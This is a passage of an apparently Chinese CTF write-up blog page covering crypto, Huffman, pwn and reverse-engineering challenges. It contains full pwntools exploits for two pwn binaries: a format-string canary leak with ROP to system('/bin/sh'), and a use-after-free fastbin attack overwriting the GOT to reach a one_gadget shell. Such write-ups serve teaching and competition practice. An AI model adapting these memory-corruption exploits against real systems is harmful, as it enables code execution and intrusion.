class="number">0x834b44a67ea419e1c3e665cedf7790ebc5fb013e2304861b667232e7ec1cae53eb253639b348a6702561671a5c5c9105eacd5d48de51427fc49f22ed2d9b60f98c50713ac95f2ac324fa58b90e0c07ab688becb771d92224be68474586376a4cd9a0ea96d5584184cbb7ad3889fd6c1a4ae3791e67a4ee6f220491abbbda2006addc6032999238cc010df759c868485522ee17e520569b7e746b0c770065f4622894afcfd46257b7c3646f15d65d561ab8e22e4f03cfbfa53ec4109115feeced84c398286bb79c58a7d640a2faec2c50285558d6b11d8ebc25eae6ece9c418dd795c0c11f459c815582c059935028cafb09b6603cc44a48f3823d0aeda73fec7</span></span><br><span class="line">e=<span class="number">0x9ae923</span></span><br><span class="line">lines = open(<span class="string">'enc'</span>).readlines()</span><br><span class="line">data = base64.b64decode(lines[<span class="number">2</span>].strip())</span><br><span class="line">dec = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10000</span>):</span><br><span class="line">    x = <span class="string">b'%.4x'</span> % i</span><br><span class="line">    v = number.bytes_to_long(x)</span><br><span class="line">    dec[pow(v, e, n)] = x</span><br><span class="line"></span><br><span class="line">raw = <span class="string">b''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>, len(data), <span class="number">256</span>):</span><br><span class="line">    prev = data[i<span class="number">-256</span>:i]</span><br><span class="line">    curr = int(strxor(prev, data[i:i+<span class="number">256</span>]).encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">    raw += dec[curr]</span><br><span class="line"><span class="keyword">print</span> int(raw,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 27986825387514002798538383912081131475566543162137579401172191042750125107908441087413251015820210861806389728393697650617153840249390232988350337051361805316366207571850623437233875282392399874324580241938167857359699053670655913886905950020197</span></span><br><span class="line"></span><br><span class="line">flag1 = int(<span class="string">'flag1&#123;Th1s_i5_wHat_You_ne3d_FirsT&#125;'</span>.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">flag2 = int(<span class="string">'flag2&#123;Fuck_Y0u_cAn_Ge7_Se3ond&#125;'</span>.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">flag=<span class="number">27986825387514002798538383912081131475566543162137579401172191042750125107908441087413251015820210861806389728393697650617153840249390232988350337051361805316366207571850623437233875282392399874324580241938167857359699053670655913886905950020197</span>/flag1/flag2</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> libnum.n2s(flag)</span><br></pre></td></tr></table></figure>

<h2 id="哈夫曼之谜"><a href="#哈夫曼之谜" class="headerlink" title="哈夫曼之谜"></a>哈夫曼之谜</h2><p>霍夫曼编码，手画 :(</p>
<p><img src="https://s2.ax1x.com/2019/04/07/AhOgBT.jpg" alt="AhOgBT.jpg"></p>
<p>得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">5	01</span><br><span class="line">d	10</span><br><span class="line">0	111</span><br><span class="line">f	110</span><br><span class="line">a	000</span><br><span class="line">l   00111</span><br><span class="line">g   00101</span><br><span class="line">&#123;   00100</span><br><span class="line">&#125;   00110</span><br></pre></td></tr></table></figure>

<p>根据密文，得到<code>flag{ddf5dfd0f05550500a5af55dd0d5d0ad}</code></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="story"><a href="#story" class="headerlink" title="story"></a>story</h2><p>栈溢出 + 格式化字符串获取 shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./story"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="string">"./story"</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x400bd3</span></span><br><span class="line">ret_addr = <span class="number">0x4009a0</span></span><br><span class="line"></span><br><span class="line">size = <span class="number">0x90</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please Tell Your ID:"</span>)</span><br><span class="line">p.sendline(<span class="string">"%15$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Hello "</span>)</span><br><span class="line">canary = int(p.recvline()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Tell me the size of your story:\n"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">'b'</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(ret_addr)</span><br><span class="line">p.sendlineafter(<span class="string">"You can speak your story:\n"</span>,payload)</span><br><span class="line">libc_addr = u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x6f690</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"Tell me the size of your story:\n"</span>,str(size))</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]+libc_addr</span><br><span class="line">bin_sh = libc.search(<span class="string">'/bin/sh'</span>).next()+libc_addr</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">'b'</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(bin_sh)+p64(system)+p64(ret_addr)</span><br><span class="line">p.recvuntil(<span class="string">"You can speak your story:\n"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="noinfoleak"><a href="#noinfoleak" class="headerlink" title="noinfoleak"></a>noinfoleak</h2><p>漏洞位于 delete 函数，free 一个堆块没有将指针置零，造成 UAF，由于只能分配小于 0x7f 的堆块，思路就是利用 UAF 控制 fastbin chunk 的 fd 指针，做 fastbin attack，由于全局指针数组中的 size 是可控的，所以可以劫持全局数组中的堆块指针和 size，将其指向 GOT 表中，修改 free 函数指针为 puts 达到泄露地址和获取 shell 的目的。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./noinfoleak"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"aaaaaaaa"</span>)    <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"bbbbbbbb"</span>)    <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x71</span>, <span class="string">"cccccccc"</span>)    <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)    <span class="comment"># 0-&gt; 1 -&gt; 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0x6010a0</span> + <span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">"bbbbbbbb"</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0x6010a0</span> + <span class="number">0x20</span>))</span><br><span class="line">payload = p64(<span class="number">0x601018</span>) + p64(<span class="number">0x7</span>) + p64(<span class="number">0x601038</span>) + p64(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x60</span>, payload)</span><br><span class="line">payload2 = p64(<span class="number">0x4006b0</span>)[:<span class="number">-1</span>]</span><br><span class="line">edit(<span class="number">3</span>, payload2)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x172970</span></span><br><span class="line">log.info(<span class="string">"libc: 0x%x"</span> % libc_addr)</span><br><span class="line">one_gadget = libc_addr + <span class="number">0xf02a4</span></span><br><span class="line">log.info(<span class="string">"one_gadget: 0x%x"</span> % one_gadget)</span><br><span class="line">edit(<span class="number">3</span>, p64(one_gadget))</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="easyCpp"><a href="#easyCpp" class="headerlink" title="easyCpp"></a>easyCpp</h2><p>主函数代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">  LODWORD(v19) = fib(j);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;vector1, &amp;v19);<span class="comment">// 16 nums</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;vector3, v20);</span><br><span class="line">v3 = <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;vector3);</span><br><span class="line">v4 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;vector2);</span><br><span class="line">v19 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;vector2);</span><br><span class="line">v5 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v19, <span class="number">1L</span>L);</span><br><span class="line"><span class="built_in">std</span>::transform&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">1</span>&#125;&gt;(</span><br><span class="line">  v5,</span><br><span class="line">  v4,</span><br><span class="line">  v3,</span><br><span class="line">  v20);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v18);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;vector3);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;vector3);</span><br><span class="line"><span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;(&amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(&amp;vector4, &amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v19);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v18);</span><br><span class="line"><span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;(&amp;vector4, &amp;vector1) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You failed!"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过调试可以发现，程序要求用户输入 16 个数字，然后将第一个数字依次加到后面所有数字上，再取倒序，最终要求结果等于斐波那契数列的前 16 项。</p>
<p>得出输入序列为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[987,-378,-611,-755,-844,-899,-933,-954,-967,-975,-980,-983,-985,-986,-987,-987]</span><br></pre></td></tr></table></figure>

<p>输入程序即得 flag。  flag{987-377-843-953-979-985}</p>
<h2 id="Testre"><a href="#Testre" class="headerlink" title="Testre"></a>Testre</h2><p>算法是 BASE58，从程序里能拿到编码后的数据，找一个在线解密的工具解密即可。</p>
<p>密文： D9cS9N9iHjMLTdA8YSMRMp</p>
<p>flag： base58_is_boring</p>

  </article>
</div>


    




</div>

<div class="footer-wrapper container">
  <footer class="footer clearfix">
    <div class="clearfix">
    <a href="https://daolgts.github.io" class="footer-logo">
      <i class="fa fa-github"></i>
    </a>
    <ul class="footer-social-link">
      <li>© 2019 daolgts</li>
      <li><a href="https://daolgts.github.io">Home</a></li>
      
      <li><a href="https://github.com/daolgts">Github</a></li>
      
    </ul>
    <div class="footer-theme-info">
      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
    </div>
    </div>
    
  </footer>
</div>


<script>
  (function() {
    var cx = '005157513716557594323:jvii0oiejlb';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
      '//cse.google.com/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>



<script src="/js/main.js"></script>

</body>
</html>
